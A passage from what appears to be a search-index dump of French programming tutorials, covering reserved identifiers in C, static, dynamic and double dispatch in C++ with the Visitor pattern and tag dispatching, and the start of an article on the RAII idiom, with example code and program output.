fonctions (par exemple printf ()) ou de variables (par exemple errno ) utilisés par celle‐ci sont à éviter, même si vous n'incluez pas l'en‐tête les utilisant. Renseignez‐vous sur les différents en‐têtes pour obtenir les noms qu'ils emploient. En plus de cela, la bibliothèque standard réserve certains types de noms dans des portées particulières. Ainsi, sont interdits : les noms commençant par un underscore et une lettre majuscule ou commençant par deux underscores et ce, peu importe leur portée [26] ; les noms commençant par un underscore et ayant une portée au niveau d'un fichier [26]. Afin de bien cerner cette interdiction, voici un petit code d'exemple. /* Interdit */ #define _HELLO /* Interdit */ #define __HELLO /* Interdit */ #define __hello /* Interdit car il a une portée au niveau d'un fichier */ #define _hello /* Interdit pour les même motifs */ struct _structure { /* Permis car il s'agit d'un membre de structure */ int _membre ; }; int main ( void ) { /* Permis car il a une portée au niveau d'un bloc */ int _variable ; /* Interdit car « auto » est un mot-clé réservé du langage */ int auto ; return 0 ; } Remarquez enfin que dans le cas de l'en‐tête <errno.h> , les noms de macro commençant par un « E » et un chiffre ou une lettre majuscule ne doivent pas non plus être employés [27] de même pour l'en‐tête <signal.h> et les noms de macro commençant par « SIG » ou « SIG_ » et une lettre majuscule [28]. [23] ISO/IEC JTC1/SC22/WG14, Doc. N1570, avril 2011, p. 59, § 6.4.2.1, al. 1. [24] Ibid. , p. 59, § 6.4.2.1, al. 2. [25] Ibid. , p. 58, § 6.4.1, al. 1. [26] Ibid. , p. 182, § 7.1.3, al. 1. [27] Ibid. , p. 205, § 7.5, al. 4. [28] Ibid. , p. 265, § 7.14, al. 4. Voilà qui termine mon exposé sur les identificateurs. J'espère que vous y voyez désormais plus clair et que vous jonglez avec les portées et les liaisons."},{"tags":"content","url":"https://yliesc.github.io/pages/pdp/content/liaisons-en-c","title":"Liaisons en C++","text":"Introduction L'objectif de cet article est de présenter les différents types de liaisons en C++. Pour cela, nous introduirons la notion de liaisons et donnerons quelques exemples des mécanismes de liaisons proposés par le C++ et, à titre d'information supplémentaire, comment émuler des mécanismes absents du C++. Nous présenterons enfin une technique dite du Tag Dispatching , que l'on pourrait traduire par « Liaison par Tag » permettant la sélection de méthodes en compile time . Cependant, même si l'ensemble des exemples et techniques sont réalisés en C++, le lecteur trouvera des informations plus générales et pourra tout aussi bien adapter le code à son langage favori, en faisant attention aux caractéristiques propres de ce langage. A noter que cet article ne se veut pas exhaustif sur les différents types de liaisons qui peuvent exister mais essaye simplement de renseigner sur les notions basiques gravitant autour du concept de liaison, d'où l'appellation d'« usuelles » pour les liaisons traitées ici. Pour de plus amples détails, la lecture de la thèse de Coplien est un bon point de départ. Introduction Notion de liaison Liaison statique ou dynamique Liaison simple ou multiple Double Dispatch en C++ : patron de conception Visiteur Tag Dispatching Présentation & Mise en place Coût Conclusion Références Notion de liaison La liaison est la capacité d'un langage à sélectionner l'implémentation d'une méthode polymorphique qui est appelée. On distingue plusieurs types de liaisons, en fonction des caractéristiques du langage mais également du contexte d'appel de la méthode ou fonction considérée. La liaison, dispatch en anglais ne doit pas être confondu avec le binding , malgré que dans beaucoup d'articles ou de livres le terme de binding remplace et / ou aggrège celui de dispatch et que la traduction française de liaison soit plus proche de la traduction de binding . Le binding est en effet la capacité à associer à un appel le nom d'une méthode, tandis que le dispatch sélectionne l'implémentation d'une méthode parmi plusieurs proposant le même nom. Le dispatch intervient donc après le binding et un binding peut être statique là où le dispatch sera dynamique. L'inverse est évidemment impossible puisqu'avant de choisir une implémentation d'une méthode il faut évidemment en choisir son nom. Cependant, selon le langage ainsi que la communauté et les habitudes de chacun, le terme dispatch peut être ou non confondu avec le terme binding , l'un désignant le concept général de sélection de la méthode à appeler et le second l'implémentation des mécanismes. Une réponse confrontant les divers avis se trouve ici . Liaison statique ou dynamique Dans un premier temps, on peut caractériser la liaison selon que toute l'information nécessaire à l'appel puisse être déduite en compile time - on parlera alors de liaison statique - ou qu'il faille un contexte donné en run time . Il y a un liaison dynamique lorsque la sélection d'une méthode à utiliser dépend d'un type qui ne sera connu qu'à l'exécution, comme celui du paramètre d'une méthode par exemple. Le C++ propose ces deux types de liaisons, la liaison statique étant le comportement par défaut et la liaison dynamique étant obtenue grâce à l'utilisation du mot clef virtual . Exemple de static dispatch : struct Foo { void f () const { cout << \"Foo::f()\" << endl ; } } ; struct Bar { void f () const { cout << \"Bar::f()\" << endl ; } } ; int main () { Foo a ; Bar b ; a . f () ; b . f () ; return 0 ; } Il est évident ici que le compilateur peut extraire de manière certaine du contexte, la méthode à appeler. L'ensemble des types utilisés par le programme principal est connu à l'avance. Nous avons donc pour sortie : Foo::f Bar::f Exemple de liaison dynamique : struct Base { virtual void f () const = 0 ; virtual ~ Base () {} }; struct Foo : public Base { void f () const { cout << \"Foo::f()\" << endl ; } }; struct Bar : public Base { void f () const { cout << \"Bar::f()\" << endl ; } }; void dispatch ( const Base & base ) { base . f (); } int main () { Foo a ; Bar b ; dispatch ( a ); dispatch ( b ) ; return 0 ; } Remarquez le type du paramètre de la fonction dispatch : il s'agit d'un objet polymorphique de type Base . Comment savoir quelle méthode membre f appeler avant l'appel explicite à la fonction dispatch ? La liaison est donc faite en fonction du contexte d'exécution. La sortie est la suivante : Foo::f Bar::f Liaison simple ou multiple On peut également caractériser davantage la liaison dynamique, en fonction de sa capacité à s'appliquer au regard du nombre d'objets polymorphiques qu'une méthode prend en paramètre. Si le langage est capable de correctement choisir l'implémentation d'une fonction appelée contenant un seul objet polymorphique, on parle de liaison simple ou Single Dispatch , s'il peut en traiter deux, on parle de Double Dispatch et pour un nombre quelconque de Multiple Dispatch de manière générale. Le C++ ne permet, nativement, que le Single Dispatch mais nous verrons qu'il est possible d'émuler du Double Dispatch assez facilement. Avant de donner quelques exemples, rappeler que lorsque l'on appelle une méthode depuis une instance de classe, il y a TOUJOURS un paramètre : l'instance de la classe qui appelle la méthode. L'écriture courante utilisant un point (ou autre selon les langages) pour séparer visuellement l'instance appelante des autres paramètres n'est que du sucre syntaxique permettant une plus grande lisibilité. Il faut donc en tenir compte lorsque l'on parle de liaison puisque dans le cas du Single Dispatch , le seul paramètre prit en compte est l'instance appelante. Nous avons donc déjà rencontré un exemple de Single Dispatch : l'exemple de la liaison dynamique donné à la section précédente. Voici un exemple qui montre le comportement limité de la liaison en C++ . Considérons les classes suivantes : struct Vehicle { virtual void print () const { cout << \"Je suis juste un vehicule ! :'(\" << endl ; }; }; struct Plane : public Vehicle { void print () const { cout << \"Je suis un avion ! :)\" << endl ; } }; struct Parking { virtual void park ( const Vehicle & v ) const { cout << \"Bienvenue au garage !\" << endl ; v . print (); }; virtual void park ( const Plane & p ) const { cout << \"Pas assez de place pour garer un avion !\" << endl ; p . print ();}; }; struct WideParking : public Parking { void park ( const Vehicle & v ) const { cout << \"Bienvenue au garage extra-large !\" << endl ; v . print (); }; void park ( const Plane & p ) const { cout << \"Il y a toute la place qu'il faut pour un avion !\" << endl ; p . print ();}; }; Et voici quelques fonctions main accompagnées de leur sortie : int main () { Vehicle v ; Plane pl ; Parking p ; WideParking wp ; p . park ( v ); wp . park ( v ); p . park ( pl ); wp . park ( pl ); return 0 ; } Et la sortie associée : Bienvenue au garage ! Je suis juste un vehicule ! :'( Bienvenue au garage extra-large ! Je suis juste un vehicule ! :'( Pas assez de place pour garer un avion ! Je suis un avion ! :) Il y a toute la place qu'il faut pour un avion ! Je suis un avion ! :) Ici, aucun soucis, nous avons bien le comportement désiré. En effet, tous les types sont bien caractérisés et peuvent être déduit en compile time , Un autre essai en utilisant un pointeur sur vehicule en lieu et place de notre instance d'avion caractérisée : int main () { Plane pl ; Vehicle & plr = pl ; Parking p ; WideParking wp ; p . park ( plr ); wp . park ( plr ); return 0 ; } Ce qui nous donne : Bienvenue au garage ! Je suis un avion ! :) Bienvenue au garage extra-large ! Je suis un avion ! :) Il s'agit toujours du comportement attendu et pourtant cette fois il y a eu liaison dynamique. En effet, on ne pouvait déterminer qu'en run time que l'objet passé aux parkings était un avion et non pas un simple véhicule. Par ailleurs, si l'on avait retiré la virtualité à la méthode print , nous n'aurions évidemment pas eu le message indiquant qu'il s'agit d'un avion. Un dernier exemple au comportement attendu avant de montrer les limites du Single Dispatch : int main () { Vehicle v ; Plane pl ; WideParking wp ; Parking & wpr = wp ; wpr . park ( v ); wpr . park ( pl ); return 0 ; } Avec pour sortie : Bienvenue au garage extra-large ! Je suis juste un vehicule ! :'( Il y a toute la place qu'il faut pour un avion ! Je suis un avion ! :) Cette fois, c'est un pointeur sur Parking qui pointe sur un objet WideParking . Les types des véhicules sont pleinement caractérisés. On pourrait alors croire qu'il y a eu une liaison statique alors qu'en réalité la liaison c'est effectuée en run time . En effet, l'instance de l'objet est un paramètre de la méthode park . Ainsi, pour appeler la bonne méthode park , il a fallu attendre l'appel effectif pour que le contexte permette de savoir qu'il s'agissait bien d'un WideParking ! Pour vous convaincre que l'instance est bien un paramètre, voici le cas pathologique : int main () { Plane pl ; Vehicle & plr = pl ; WideParking wp ; Parking & wpr = wp ; wp . park ( pl ); wp . park ( plr ); wpr . park ( pl ); wpr . park ( plr ); return 0 ; } Et nous obtenons ainsi : Il y a toute la place qu'il faut pour un avion ! Je suis un avion ! :) Bienvenue au garage extra-large ! Je suis un avion ! :) Il y a toute la place qu'il faut pour un avion ! Je suis un avion ! :) Bienvenue au garage extra-large ! Je suis un avion ! :) Les 3 premiers appels ont été traités dans les exemples précédents. Le dernier ne donne cependant pas le résultat correct ! En effet, nous aurions aimé avoir : Il y a toute la place qu'il faut pour un avion ! Je suis un avion ! :) Le Single Dispatch fait que la résolution ne permet pas de trouver la bonne implémentation entre WideParking::park(const Vehicle&) const et WideParking::(const Plane&) const ainsi, c'est la première qui est appelée puisque c'est le type légitime de plr . On voit bien que le premier argument traité pour le dispatching est l'instance de l'objet qui appelle la méthode, puisqu'on appelle bien une méthode de l'objet WideParking et non pas Parking . D'où provient cette limitation en nombre qui peut sembler surprenante ? La raison est assez simple et n'est pourtant pas liée directement au C++. Le mécanisme de résolution des appels virtuels se fait au travers d'une structure de données appelée la vtable qui ne permet pas directement de faire de la liaison multiple. La vtable se charge de stocker dans un tableau interne et invisible au programmeur, des pointeurs vers les instances de classes allouées. Typiquement, une vtable sera créée pour chaque classe. Là où le bat blesse, c'est que l'implémentation de la vtable est dépendante du compilateur, de même que les mécanismes nécessaires à son bon fonctionnement (notamment l'ajout de code dans le constructeur des objets, pointeurs internes à l'instance). Pire encore, le standard ne spécifie pas l'usage d'une vtable pour la liaison dynamique et donc, en théorie, il serait possible d'utiliser des alternatives. Cependant, le standard guide suffisemment pour que l'approche vtable soit celle retenue par tous les compilateurs. Pour information, diverses autres solutions existent, notamment des arbres binaires de recherche ou des tables de hashages. L'avantage de la vtable est sa simplicité d'implémentation et ses performances plutôt bonnes. Notons que sous gcc, l'option -fdump-class-hierarchy permet d'afficher la vtable. Double Dispatch en C++ : patron de conception Visiteur Le besoin de liaison double est un besoin relativement courant en développement logiciel et c'est donc tout naturellement qu'un patron de conception visant à résoudre le problème a vu le jour. Connu sous le nom de Visiteur, il permet de simuler une liaison double lorsque le nombre de classes est relativement restreint (sinon le surcoût en terme de code et donc de maintenabilité devient problématique). Si techniquement il permet la simulation de la liaison double dynamique, les problèmes rencontrés qui amènent à se tourner vers cette solution relèvent plutôt de la séparation entre algorithme et structure de données. Le principe est d'avoir une méthode publique pour chaque objet devant être visité, prenant un objet Visiteur devant effectuer un traitement en utilisant des données internes à l'objet visité. Cette méthode publique va appeler la méthode effectuer ce traitement sur l'instance du Visiteur, tout en lui donnant une réference sur lui même. Concrètement, admettons que nous ayons ces quelques classes : class A ; class B : public A {}; class C : public A {}; Pour chaque objet dérivant de A, nous devons créer une méthode acceptant un Visisteur : void B :: acceptVisit ( Visitor * visitor ) { visitor -> visitB ( this ) ; } void C :: acceptVisit ( Visitor * visitor ) { visitor -> visitC ( this ) ; } Enfin, nous devons créer notre visiteur et chacune de ses méthodes pour visiter nos objets. void Visitor :: visitB ( B * object ) { // Le traitement de l'objet de type B en utilisant une instance pleinement caractérisée } On comprendra donc pourquoi le visiteur n'est une solution efficace et élégante qu'en présente d'un nombre restreint de classes. La littérature sur les patrons de conception étant vaste et très bien fournie, je me contenterai ici de ce strict minimum pour parler du tag dispatching , beaucoup moins représenté. Tag Dispatching Présentation & Mise en place Le Tag Dispatching est une technique de métaprogrammation permettant de choisir en compile time un algorithme ou plus généralement une fonction polymorphique en fonction des besoins. Cette technique est donc souvent couplée aux classes de politique ou Type Traits . Concrètement, il s'agit de surcharger une fonction en rajoutant un paramètre invisible pour l'utilisateur : le tag. Seule la version sans tag est laissée publique et c'est cette version qui va appeler la version correcte au travers du tag correspondant. Un tag est une structure de donnée vide, qui porte généralement l'information utile grâce à son ou ses templates. Imaginons une politique de gestion du parallélisme constituée de deux classes : MonoThread et MultiThread . Dans le premier cas, aucun mécanisme de vérification d'accès concurrent ne sera fourni, tandis que la seconde fourni toute l'interface nécessaire au parallélisme. J'ai un algorithme qui dépend d'une heuristique, qui pourra être changée à la volée en fonction du contexte. Cependant, si je peux paralléliser le traitement de mon heuristique avec d'autres étapes de mon algorithme, l'algorithme et l'heuristique vont accéder à des données en commun et il est donc important de s'assurer que l'heuristique est thread-safe (elle a le niveau de granularité le plus fin, c'est donc à elle d'assurer ce rôle). Cependant, il existe des cas où l'on ne veut pas exécuter en parallèle l'heuristique (parce que les accès concurrents feraient perdre trop de temps pour un gain non significatif, parce que la machine cible ne sera capable de gérer le multithread correctement, etc). Le Tag Dispatching va nous permettre d'appeler la bonne version de l'algorithme selon la politique de l'heuristique. Voici les politiques : struct MonoThread { void Lock () { cout << \"Rien à locker, je suis en monothread !\" << endl ; } void Unlock () { cout << \"Rien à unlocker !\" << endl ; } }; class MultiThread { public : void Lock () { m . lock (); cout << \"Je lock le scope, des accès concurrents sont possibles. \" << endl ; } void Unlock () { cout << \"On delock le scope !\" << endl ; m . unlock (); } protected : std :: mutex m ; }; Et voici l'heuristique. Il faut bien comprendre que l'heuristique ne fait pas forcément ses traitements en parallèle. Le lock effectué s'assure juste l'exclusivité sur l'accès des données partagées (non représentées ici). template < class ThreadPolicy = MonoThread > struct Heuristic : protected ThreadPolicy { void operator ()() { ThreadPolicy :: Lock (); cout << \"On lance l'heuristique !\" << endl ; ThreadPolicy :: Unlock (); }; }; Enfin, voici les tags et l'algorithme : template < bool > struct isMultiThread {}; using multi_tag = isMultiThread < true > ; using mono_tag = isMultiThread < false > ; Tout d'abord, nous définissons le tag général : l'information utile est portée par le template booléen. Soit nous sommes en multithread , soit nous sommes en monothread et ainsi nous spécialisons les tags. A noter que dans un cas plus complexe, il est possible de laisser un cas par défaut. class Algo { public : template < class T > void operator ()( Heuristic < T >& h ) { cout << \"On lance l'algorithme !\" << endl ; cout << \"Quelques étapes d'initiatialisation\" << endl ; operator ()( h , isMultiThread < is_same < T , MultiThread >:: value > ()); } protected : template < class T > void operator ()( Heuristic < T >& h , const multi_tag & ) { cout << \"Chouette, mon heuristique est protégée, je peux la lancer en parallèle\" << endl ; thread t ( ref ( h )); cout << \"Quelques opérations en parallèle de mon heuristique.\" << endl ; t . join (); } template < class T > void operator ()( Heuristic < T >& h , const mono_tag & ) { cout << \"Mince, mon heuristique n'est pas parallèle.\" << endl ; h (); } }; Seule la version sans tag de l'opérateur () est laissée publique. Les templates étant résolus à la compilation, lorsque le compilateur arrive sur la ligne operator()(h, isMultiThread<is_same<T, MultiThread>::value>()); , il va remplacer l'appel par le résultat du type trait de la bibliothèque standard is_same qui renvoie la valeur vrai si les types des deux templates spécifiés sont les même et faux autrement. Ainsi, si la politique T de l'heuristique est MultiThread , cette ligne sera équivalente à operator()(h, multi_tag) qui correspond au prototype de l'appel parallèle puisque multi_tag est un alias sur isMultiThread<true> . Dans le cas contraire, c'est l'appel séquentiel qui sera engagé. Avec le main suivant : int main () { Heuristic < MultiThread > heur_mt ; Algo algo ; algo ( heur_mt ); return 0 ; } Nous obtenons la sortie suivante : On lance l'algorithme ! Quelques étapes d'initiatialisation Chouette, mon heuristique est protégée, je peux la lancer en parallèle Quelques opérations en parallèle de mon heuristique. Je lock le scope, des accès concurrents sont possibles. On lance l'heuristique ! On delock le scope ! Et si l'on change la politique de l'heuristique pour MonoThread : On lance l'algorithme ! Quelques étapes d'initiatialisation Mince, mon heuristique n'est pas parallèle. Rien à locker, je suis en monothread ! On lance l'heuristique ! Rien à unlocker ! Précisions tout de même que cette implémentation n'est pas exception safe mais laissée en l'état pour des raisons pédagogiques. Coût Le coût du Tag Dispatching est très faible puisqu'il ne représente qu'un temps de compilation plus élevé et l'appel d'une fonction supplémentaire. En terme de place mémoire, le compilateur optimise normalement les tags qui disparaitront, étant vides et non utilisés en run time . Conclusion Au cours de cet article nous avons pu aborder une bonne partie des mécanismes de liaisons, qu'ils soient statiques ou dynamiques, simples ou multiples. Nous avons également donné des pistes pour émuler une liaison dynamique double en C++ avec le patron de conception Visiteur, et d'une technique de programmation générique permettant la sélection de fonction en compile time, à savoir le Tag Dispatching . Pour conclure, notons qu'il existe diverses méthodes pour implémenter de manière plus élégante que le Visiteur la liaison dynamique mais nous laissons cela en référence pour le lecteur qui voudrait aller plus loin. Est également présent dans les références, un article sur des structures de données liées aux liaisons dynamiques. Références Open Multi-Methods for C++ , P. Pirkelbauer Y. Solodkyy B. Stroustrup Evaluation of Control Structures for Dynamic Dispatching , O. Zendra K.Driesen Multi-Paradigm Design , de James O. Coplien"},{"tags":"content","url":"https://yliesc.github.io/pages/pdp/content/lidiome-raii-applique-au-c","title":"L'idiome RAII appliqué au C++","text":"La gestion des ressources est un problème récurrent en informatique. En effet, on ne dispose que de ressources limitées (RAM, disques durs, nombre de calculs par seconde, etc). Et aujourd'hui, il faut admettre qu'on charge de plus en plus de ressources qui prennent de la place. Il faut donc les gérer efficacement. Certains langages, comme le C, oblige l'utilisateur à allouer et libérer de la mémoire pour les ressources et il faut dire que c'est contraignant. Le C++, de par l'approche historique qui en est malheureusement faite dans beaucoup d'ouvrages, est utilisé par certains développeurs comme le C, en gérant les ressources de manière manuelle. Pourtant, il existe un idiome très simple et efficace que nous allons découvrir dans cet article. Alors oubliez vos new et delete et découvrez ce que C++ vous offre. Gestion manuelle de la mémoire L'idiome RAII à la rescousse Gestion des erreurs Erreur lors de l'acquisition Erreur lors de la destruction Un mot sur le dispose pattern Exemples d'application avec la bibliothèque standard Cas particulier des pointeurs Bonnes pratiques La const-correctness Et dans les autres langages ? Avec C Avec D Avec Rust Gestion manuelle de la mémoire Bien souvent, dès qu'on manipule des ressources externes, du type image à charger et afficher, connexion à une base de données ou à un serveur ou autres, il est inévitable de devoir réserver de la mémoire de façon dynamique. Pour ceux qui ont fait du C, vous pensez sans doute aux pointeurs et vous avez bien raison. Prenons donc un bête exemple : on se connecte à une base de données, on récupère un nombre fixé de noms de trains, on ouvre un fichier, on le verrouille, on travaille ensuite dessus avant de tout refermer comme il se doit. void get_infos_from_db () { SGBD * sgbd = SGBD_Init ( \"trains.db\" ); const int nb_trains = 2 ; char ** trains_name = malloc ( nb_trains * sizeof ( char * )); for ( int i = 0 ; i < nb_trains ; ++ i ) { char buffer [ 256 ]; trains_name [ i ] = malloc ( 42 * sizeof ( char )); sprintf ( buffer , \"SELECT name FROM trains WHERE id = %d\" , i ); strcpy ( trains_name [ i ], do_request ( sgbd , buffer )); } File * file = fopen ( \"saved.txt\" ); Lock * lock = lock_acquire (); do_some_stuff ( trains_name , file , lock ); lock_release ( lock ); fclose ( file ), file = NULL ; for ( int i = 0 ; i < nb_trains ; ++ i ) { free ( trains_name [ i ]), trains_name [ i ] = NULL ; } free ( trains_name ), trains_name = NULL ; SGBD_release ( sgbd ); } Pourtant, ce code est juste une horreur à éviter. Pourquoi ? Parce qu'aucune vérification n'est faite. Si une seule opération échoue, on est bon pour un segfault. Alors, sécurisons ce code. void darray_delete ( void ** self , unsigned n ) { if ( self != NULL ) { unsigned i ; for ( i = 0 ; i < n ; ++ i ) { free ( self [ i ]); } free ( self ); } } void ** darray_create ( unsigned n , unsigned m , size_t size ) { void ** self ; unsigned i ; assert ( n != 0 && m != 0 && size != 0 ); assert ( SIZE_MAX / sizeof * self >= n ); assert ( SIZE_MAX / m >= size ); self = malloc ( n * sizeof * self ); if ( self == NULL ) { goto alloc_array_fail ; } for ( i = 0 ; i < n ; ++ i ) { self [ i ] = malloc ( m * size ); if ( self [ i ] == NULL ) { goto alloc_element_fail ; } } return self ; alloc_element_fail : darray_delete ( self , i ); alloc_array_fail : return NULL ; } #define NTRAINS 2 #define TRAIN_MAX 42 #define BUFFER_MAX 256 void get_infos_from_db ( void ) { SGBD * sgbd ; void ** trains_name ; FILE * file ; Lock * lock ; unsigned i ; sgbd = SGBD_Init ( \"trains.db\" ); if ( sgbd == NULL ) { write_error_log ( SGBD_FAIL ); goto sgbd_fail ; } trains_name = darray_create ( NTRAINS , 1 , TRAIN_MAX ); if ( trains_name == NULL ) { write_error_log ( TRAIN_CREATE_FAIL ); goto darray_create_fail ; } for ( i = 0 ; i < NTRAINS ; ++ i ) { char buffer [ BUFFER_MAX ]; int n ; n = spnrintf ( buffer , sizeof buffer , \"SELECT name FROM trains WHERE id = %d\" , i ); if ( n < 0 || n > sizeof buffer ) { write_error_log ( SNPRINTF_FAIL ); goto snprintf_fail ; } strcpy ( trains_name [ i ], do_request ( sgbd , buffer )); } file = fopen ( \"saved.txt\" ); if ( file == NULL ) { write_error_log ( FILE_FAIL ); goto fopen_fail ; } lock = lock_acquire (); if ( lock == NULL ) { write_error_log ( LOCK_FAIL ); goto lock_acquire_fail ; } /* * Stuff */ lock_release ( lock ); lock_acquire_fail : fclose ( file ); fopen_fail : snprintf_fail : darray_delete ( trains_name , NTRAINS ); darray_create_fail : SGBD_release ( sgbd ); sgbd_fail : ; } #undef NTRAINS #undef TRAIN_MAX #undef BUFFER_MAX Quelle plaie à écrire ! Non seulement c'est long, mais en plus, c'est plus complexe à comprendre, on peut avoir oublié certains cas, bref, un cauchemar. Et encore, on aurait pu avoir à initialiser plus de ressources encore. Peut-être certains d'entre vous pensent que goto c'est un héritage du C dépassé et qu'en C++ on devrait plutôt utiliser les exceptions. Soit, essayons. void get_infos_from_db () { const int nb_trains = 2 ; SGBD * sgbd ; try { sgbd = SGBD_Init ( \"trains.db\" ); } catch ( sgbd_exception const & e ) { write_error_log ( e ); throw ; } char ** trains_name ; try { trains_name = new char * [ nb_trains ]; } catch ( std :: bad_alloc const & e ) { SGBD_release ( sgbd ); write_error_log ( e ); throw ; } int last_good_alloc_index = 0 ; for ( int i = 0 ; i < nb_trains ; ++ i ) { char buffer [ 256 ]; try { trains_name [ i ] = new char [ 42 ]; } catch ( std :: bad_alloc const & e ) { for ( int i = 0 ; i < last_good_alloc_index ; ++ i ) { delete [] trains_name [ i ], trains_name [ i ] = NULL ; } delete [] trains_name , trains_name = NULL ; SGBD_release ( sgbd ); write_error_log ( e ); throw ; } last_good_alloc_index = i ; sprintf ( buffer , \"SELECT name FROM trains WHERE id = %d\" , i ); strcpy ( trains_name [ i ], do_request ( sgbd , buffer )); } File * file ; try { file = fopen ( \"saved.txt\" ); } catch ( file_exception const & e ) { for ( int i = 0 ; i < nb_trains ; ++ i ) { delete [] trains_name [ i ], trains_name [ i ] = NULL ; } delete [] trains_name , trains_name = NULL ; SGBD_release ( sgbd ); write_error_log ( e ); throw ; } Lock * lock ; try { lock = lock_acquire (); } catch ( lock_exception const & e ) { fclose ( file ), file = NULL ; for ( int i = 0 ; i < nb_trains ; ++ i ) { delete [] trains_name [ i ], trains_name [ i ] = NULL ; } delete [] trains_name , trains_name = NULL ; SGBD_release ( sgbd ); write_error_log ( e ); throw ; } do_some_stuff ( trains_name , file , lock ); lock_release ( lock ); fclose ( file ), file = NULL ; for ( int i = 0 ; i < nb_trains ; ++ i ) { free ( trains_name [ i ]), trains_name [ i ] = NULL ; } free ( trains_name ), trains_name = NULL ; SGBD_release ( sgbd ); } Finalement, ce code ne nous apporte aucun avantage par rapport au précédent : toujours aussi gros, toujours aussi illisible, et nous ne sommes même pas sûr de couvrir tous les chemins possibles : un oubli est possible, une fonction apparemment inoffensive peut lancer une exception, bref, toujours un cauchemar à maintenir. Que retenir jusque là : que la détection d'erreurs par retour de fonctions et goto ou les exceptions nécessitent d'ajouter des if ou des try catch toutes les deux lignes. En fait, dans ces cas de figure, chaque ligne où l'on acquiert une ressource qui n'est pas suivie d'un if ou entourée d'un try catch est suspecte et peut potentiellement faire échouer l'exécution. Le cœur du problème tient en une phrase : le développeur doit écrire du code spécifique pour la libération de la mémoire et la gestion des erreurs. Pour améliorer la situation, il faut obligatoirement libérer le développeur de cette tâche, qu'elle soit automatique. Hors, contrairement au C# ou au Java qui disposent d'un mécanisme de libération de la mémoire transparent et automatique appelé garbage collector , il n'est rien de tel en C++. Sommes-nous donc condamner à devoir écrire des codes aussi lourds ? Non, car une solution existe déjà. L'idiome RAII à la rescousse Le C++ propose un idiome particulier appelé RAII , pour « Resource Acquisition Is Initialization », ce que l'on peut traduire par « acquisition de ressources lors de l'initialisation » en français. Comment fonctionne t-il ? Chaque ressource sera manipulée par une variable locale qui va l'acquérir à la construction et la libérer à la destruction. Ainsi, l'utilisateur n'aura même plus à se soucier d'appeler les fonctions free , unlock et autres delete pour que la libération des ressources ait bien lieu. Pour appliquer cet idiome en C++, nous allons utiliser les classes et en particulier le couple constructeur(s) / destructeur. On peut parler de capsules RAII . Toutes les ressources seront acquises dans le constructeur ; si des ressources sont impossibles à acquérir, on lève une exception. Ainsi, il n'y a pas de risque de créer un objet incomplet (« Ill formed » en anglais) donc pas de risque de fuite de mémoire : la norme garantit en effet que si un constructeur lève une exception, toute la mémoire déjà allouée est libérée. Toutes les ressources seront libérées dans le destructeur . Celui-ci étant appelé automatiquement dès que l'objet est détruit, on y écrira tous les mécanismes de libération de la ressources acquise dans le constructeur. ( Quand je dis « toutes les ressources seront acquises dans le constructeur », en fait, il faut une seule acquisition de ressource par capsule RAII, sinon on retombe sur le besoin de try - catch qu'on cherche à éviter. ) Voyons sans plus tarder comment appliquer ce principe à notre code précédent. Commençons tout d'abord par encapsuler nos ressources dans des classes, en prennant par exemple le SGBD. class Sgbd_Capsule { public : Sgbd_Capsule ( const char * db ) { /* Appels de méthodes, initialisations d'attributs, etc */ this -> m_sgbd = SGBD_Init ( db ); } ~ Sgbd_Capsule () { /* On libère les ressources allouées */ SGBD_release ( this -> m_sgbd ); } private : SGBD * m_sgbd ; }; Maintenant, nous pouvons écrire du code aussi simple que celui ci-dessous (et nous verrons que nous pouvons faire encore plus simple dans la section suivante). int foo () { Sgbd_Capsule sgbd ( \"trains.db\" ); /* Des opérations diverses sur le SGBD. */ return 42 ; } Les ressources sont libérées à la sortie du bloc dans lequel nous les avons acquises , c'est à dire ici en sortant de la fonction. Voiyez par vous mêmes l'exemple suivant. class Test { public : Test ( int number ) : m_number ( number ) { std :: cout << \"Acquisition de la ressource n°\" << this -> m_number << std :: endl ; } ~ Test () { std :: cout << \"Libération de la ressource n°\" << this -> m_number << std :: endl ; } private : int m_number ; }; int main () { Test a ( 1 ); { Test b ( 2 ); { Test c ( 3 ); Test d ( 4 ); } Test e ( 5 ); } return 0 ; } Acquisition de la ressource n°1 Acquisition de la ressource n°2 Acquisition de la ressource n°3 Acquisition de la ressource n°4 Libération de la ressource n°4 Libération de la ressource n°3 Acquisition de la ressource n°5 Libération de la ressource n°5 Libération de la ressource n°2 Libération de la ressource n°1 Gestion des erreurs Il reste néanmoins un problème que nous ne gerons pas encore : que fait-on si une erreur survient lors de l'acquisition ou de la libération des ressources ? Examinons chacun des cas. Erreur lors de l'acquisition Si on ne peut acquérir une ressource, alors l'objet ne peut être construit. Le mieux est donc de lancer une exception. La norme garantie que si une exception est lancée dans le constructeur, alors toutes les ressources acquises avant le lancer de l'exception sont libérées. Le seul cas où la mémoire n'est pas libérée est si le constructeur alloue lui-même de la mémoire (à l'aide d'un new par exemple). Nous verrons néanmoins dans la section suivante comment éviter ce problème. class Sgbd_Capsule { public : Sgbd_Capsule ( const char * db ) { /* Appels de méthodes, initialisations d'attributs, etc */ this -> m_sgbd = SGBD_Init ( db ); if ( this -> m_sgbd == nullptr ) { throw sgbd_exception ( \"Le SGBD ne peut être initialisé\" ); } } ~ Sgbd_Capsule () { /* On libère les ressources allouées */ SGBD_release ( this -> m_sgbd ); } private : SGBD * m_sgbd ; }; Enfin, un conseil important que je répète : si on a plusieurs ressources à acquérir dans un même constructeur, il vaut mieux que chaque ressource soit encapsulée dans sa propre capsule RAII ; ainsi, chaque ressource sera libérée par son propre destructeur et on s'évite bien des soucis. Erreur lors de la destruction Ces cas là sont problématiques. En effet, il est impossible de lancer une exception. Pourquoi ? Nous savons que le destructeur d'un objet sera appellé si une exception est lancée dans le code ; hors, si le destructeur lance lui aussi une exception, nous nous retrouvons avec deux exceptions sur les bras, ce qui provoque un appel à la fonction terminate() et donc l'arrêt brutal du programme. De même, n'appelez jamais de fonctions dans le destructeur qui sont susceptibles de lancer des exceptions. On peut néanmoins utiliser un système de logs pour informer l'utilisateur qu'une erreur dans la libération des ressources est arrivée. Quand à savoir si l'on continue l'exécution ou s'il vaut mieux tout arrêter, c'est à vous de voir en fonction des situations. Un mot sur le dispose pattern Peut-être venez-vous d'un langage où il existe un mot-clef finally , utilisé à la suite d'un try - catch et exécuté peu importe si une exception a été attrapé ou non ; ou bien existe t'il des constructions similaires du type using (C#), with (Python) ou encore try -with-ressources (Java 7+). Dans tous les cas, le but est le même : empêcher des fuites de mémoire en libérant des ressources précédemment allouées. C'est ce qu'on appelle le dispose pattern . Pourtant, C++ ne fournit pas de mot-clefs ou de constructions similaires à celles de Java ou C# pour la simple et bonne raison que RAII nous permet de faire la même chose de façon plus efficace. Qu'est 